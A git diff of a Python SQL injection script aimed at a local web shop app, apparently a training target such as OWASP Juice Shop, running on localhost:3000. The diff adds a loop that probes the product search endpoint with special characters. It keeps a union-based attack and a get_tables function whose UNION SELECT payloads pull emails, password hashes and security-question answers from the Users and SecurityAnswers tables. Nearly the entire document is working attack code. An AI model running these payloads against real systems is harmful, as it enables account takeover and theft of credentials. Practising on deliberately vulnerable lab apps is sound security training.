@@ -3,17 +3,18 @@ import random
 import json
 
 def main ():
-    if not check_search_query():
-        print("Search query is not injectable")
+    check_search_query()
 
+    input("Press enter to continue...")
     random_union_based_attack()
 
-    get_users()
+    input("Press enter to continue...")
+    get_tables()
     
     
 def check_search_query():
-    url = "http://localhost:3000/rest/products/search?q="
-
+    print("CHECKING IF SEARCH QUERY IS INJECTABLE\n")
+    url = "http://localhost:3000/rest/products/search?q=a"
     # confirm we can reach the website
     try: 
         response = requests.get(url)
@@ -21,24 +22,31 @@ def check_search_query():
     except requests.exceptions.RequestException:
         print("Error occured while requesting " + url)
         return
-    
-    # test to see if it is injectable 
-    url = "http://localhost:3000/rest/products/search?q=a\'"
 
-    try:
-        response = requests.get(url, headers={'Accept':'application/json'}) #as json
-        response.raise_for_status()
-    except requests.exceptions.HTTPError as e:
-        # print raw error
-        print("Error",e.response.json())
+    payloads = [
+        "\"", "\b", "%", ";", "--", "/*", "*/", "`", "\\", 
+        "0x00", "0x1a", "0x1b", "0x1c", "0x1d", "0x1e", "0x1f", 
+        "0x7f", "0x80", "0x81", "0x82", "0x83", "0x84", "0x85", 
+        "0x86", "0x87", "0x88", "0x89", "0x8a", "0x8b", "0x8c", 
+        "0x8d", "0x8e", "0x8f", "0x90", "0x91", "0x92", "0x93", 
+        "0x94", "0x95", "0x96", "0x97", "0x98", "0x99", "0x9a", 
+        "0x9b", "0x9c", "0x9d", "0x9e", "0x9f", "0xa0", "'", 
+    ]
 
-    json = response.json()
-    code = json['error']['code']
-    print(code)
-    if code == "SQLITE_ERROR":
-        return True
-    return False
+    for payload in payloads:
+        
+        print(f"testing payload: {payload} \n")
+        full_url = url + payload
 
+        try:
+            response = requests.get(full_url, headers={'Accept':'application/json'}) #as json
+            response.raise_for_status()
+        except requests.exceptions.HTTPError as e:
+            # print raw error
+            print("Error",e.response.json())
+
+        json = response.json()
+        print(json)
 
 def random_union_based_attack():
     payloads = [
@@ -58,19 +66,19 @@ def random_union_based_attack():
         
         full_url = url + payload
 
-        print("testing payload: ", full_url)
+        print(f"testing payload: {full_url} \n")
         
         try:
             response = requests.get(full_url, headers={'Accept': 'application/json'})
             response.raise_for_status()
         except requests.exceptions.HTTPError as e:
-            print("Error", e.response.json())
+            print("Error", e.response.json(), "\n")
             continue
         
         json = response.json()
         print_json_nicely(json)
 
-def get_users():
+def get_tables():
     payloads = [
         "a\')) UNION SELECT id, email, password, 4, 5, 6, 7, 8, 9 FROM Users--",
         "a\')) UNION SELECT UserId, SecurityQuestionId, answer, 4, 5, 6, 7, 8, 9 FROM SecurityAnswers--",
@@ -92,6 +100,8 @@ def get_users():
         
         json = response.json()
         print_json_nicely(json)
+    
+
 
 def print_json_nicely(json_data):
     print(json.dumps(json_data, indent=4, sort_keys=True))
